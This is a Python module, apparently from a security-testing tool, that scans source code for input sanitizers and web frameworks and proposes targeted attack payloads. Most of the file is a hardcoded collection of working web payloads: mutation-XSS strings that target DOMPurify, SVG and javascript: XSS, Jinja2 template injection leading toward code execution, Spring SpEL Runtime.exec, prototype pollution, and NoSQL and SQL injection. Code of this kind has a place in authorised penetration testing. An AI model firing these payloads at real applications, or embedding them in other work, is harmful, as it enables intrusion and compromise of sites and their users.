"""Generate informed payloads based on source code patterns.

VT-Spec R3: Source-informed exploitation for higher success rate.
"""

from __future__ import annotations

import logging
from typing import Dict, List

from pydantic import BaseModel, Field

logger = logging.getLogger(__name__)


class SanitizerInfo(BaseModel):
    """Detected input sanitizer in source code."""

    name: str  # e.g., "DOMPurify", "html_escape"
    file: str  # relative file where found
    line: int = 0
    scope: str = "unknown"  # "global", "route-specific", "middleware"


class PayloadHint(BaseModel):
    """Informed payload suggestion based on detected defenses."""

    vuln_type: str  # "xss", "sqli", "ssti", etc.
    payload: str
    rationale: str  # why this payload for this target
    bypass_target: str  # what defense it tries to bypass
    confidence: float = Field(default=0.5, ge=0.0, le=1.0)


class PayloadAdvisor:
    """Generate informed payloads based on source code patterns.

    Analyzes detected sanitizers and framework to suggest targeted payloads.
    """

    SANITIZER_BYPASSES: Dict[str, List[Dict[str, str]]] = {
        "DOMPurify": [
            {
                "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
                "rationale": "DOMPurify mXSS via math/table nesting",
                "vuln_type": "xss",
            },
            {
                "payload": "<svg><use href='data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>'>",
                "rationale": "DOMPurify SVG use href bypass",
                "vuln_type": "xss",
            },
        ],
        "html_escape": [
            {
                "payload": "{{7*7}}",
                "rationale": "SSTI if template engine processes escaped output",
                "vuln_type": "ssti",
            },
            {
                "payload": "${7*7}",
                "rationale": "Template literal injection (ES6/Freemarker)",
                "vuln_type": "ssti",
            },
        ],
        "strip_tags": [
            {
                "payload": "<svg/onload=alert(1)>",
                "rationale": "Self-closing SVG bypasses naive strip_tags",
                "vuln_type": "xss",
            },
            {
                "payload": "<img src=x onerror=alert(1)//",
                "rationale": "Unclosed tag may bypass incomplete strip_tags",
                "vuln_type": "xss",
            },
        ],
        "prepared_statements": [],  # No bypass — resistant
        "parameterized_query": [],  # No bypass — resistant
        "bleach": [
            {
                "payload": "<a href='javascript:alert(1)'>click</a>",
                "rationale": "Bleach may allow href with javascript: protocol",
                "vuln_type": "xss",
            },
        ],
        "escape": [
            {
                "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
                "rationale": "Hex encoding may bypass basic escape()",
                "vuln_type": "xss",
            },
        ],
    }

    FRAMEWORK_WEAKNESSES: Dict[str, List[Dict[str, str]]] = {
        "express": [
            {
                "payload": '{"__proto__": {"isAdmin": true}}',
                "rationale": "Prototype pollution via JSON body parsing",
                "vuln_type": "prototype_pollution",
            },
            {
                "payload": '{"$gt": ""}',
                "rationale": "NoSQL injection in MongoDB queries",
                "vuln_type": "nosql_injection",
            },
        ],
        "flask": [
            {
                "payload": "{{config.items()}}",
                "rationale": "SSTI via Jinja2 template injection",
                "vuln_type": "ssti",
            },
            {
                "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
                "rationale": "Jinja2 SSTI RCE via class traversal",
                "vuln_type": "ssti",
            },
        ],
        "django": [
            {
                "payload": "') OR 1=1--",
                "rationale": "ORM injection in extra() or raw() calls",
                "vuln_type": "sqli",
            },
            {
                "payload": "{% load module %}{% debug %}",
                "rationale": "Django template injection if user-controlled",
                "vuln_type": "ssti",
            },
        ],
        "spring": [
            {
                "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "rationale": "SpEL injection in Spring Expression Language",
                "vuln_type": "spel_injection",
            },
            {
                "payload": "/actuator/env",
                "rationale": "Exposed Spring Boot actuator endpoints",
                "vuln_type": "info_disclosure",
            },
        ],
        "fastapi": [
            {
                "payload": "{{config}}",
                "rationale": "SSTI if Jinja2 templates used with user input",
                "vuln_type": "ssti",
            },
        ],
    }

    def advise(
        self, framework: str, sanitizers: List[SanitizerInfo]
    ) -> List[PayloadHint]:
        """Generate payload hints based on detected defenses."""
        hints: List[PayloadHint] = []

        # Framework-specific weaknesses
        fw_payloads = self.FRAMEWORK_WEAKNESSES.get(framework, [])
        for p in fw_payloads:
            hints.append(
                PayloadHint(
                    vuln_type=p["vuln_type"],
                    payload=p["payload"],
                    rationale=p["rationale"],
                    bypass_target=f"framework:{framework}",
                    confidence=0.4,
                )
            )

        # Sanitizer-specific bypasses
        for sanitizer in sanitizers:
            bypasses = self.SANITIZER_BYPASSES.get(sanitizer.name, [])
            if not bypasses:
                # Sanitizer is considered resistant
                logger.info(
                    "Sanitizer %s in %s is resistant — no known bypasses",
                    sanitizer.name,
                    sanitizer.file,
                )
                continue

            for bp in bypasses:
                hints.append(
                    PayloadHint(
                        vuln_type=bp["vuln_type"],
                        payload=bp["payload"],
                        rationale=bp["rationale"],
                        bypass_target=f"sanitizer:{sanitizer.name}",
                        confidence=0.6,
                    )
                )

        return hints

    def detect_sanitizers(self, source_path: "Path", content_map: Dict[str, str]) -> List[SanitizerInfo]:
        """Detect sanitizers in source code files.

        Args:
            source_path: Root source path (unused, for API compat)
            content_map: Dict of {relative_path: file_content}
        """
        import re

        sanitizers: List[SanitizerInfo] = []
        patterns = {
            "DOMPurify": r"DOMPurify\.sanitize|createDOMPurify",
            "html_escape": r"html\.escape|html_escape|markupsafe\.escape|escape\(",
            "strip_tags": r"strip_tags|striptags",
            "bleach": r"bleach\.clean|bleach\.sanitize",
            "prepared_statements": r"cursor\.execute\(.+%s|\.prepare\(|PreparedStatement",
            "parameterized_query": r"\?\s*,|\$\d+|:param|@param",
            "escape": r"(?<!html\.)escape\(",
        }

        for file_path, content in content_map.items():
            lines = content.split("\n")
            for name, pattern in patterns.items():
                for line_num, line in enumerate(lines, 1):
                    if re.search(pattern, line, re.IGNORECASE):
                        sanitizers.append(
                            SanitizerInfo(
                                name=name,
                                file=file_path,
                                line=line_num,
                                scope="route-specific",
                            )
                        )
                        break  # One detection per file per sanitizer

        return sanitizers
